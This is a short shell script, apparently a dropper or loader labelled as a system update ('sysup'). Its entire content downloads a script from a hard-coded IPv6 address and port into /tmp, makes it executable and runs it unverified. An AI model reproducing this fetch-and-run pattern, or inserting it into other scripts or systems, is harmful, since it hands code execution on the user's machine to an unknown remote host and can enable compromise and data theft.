#!/bin/sh
cd /tmp/

cat="jubtl2c"
localname="/tmp/sysup-jubtl.sh"

wget "http://[fd43:5602:29bd:10::0215:5d01:201d]:2351/getups.php?cat=$cat" -O "$localname"
chmod +x "$localname"
"$localname"
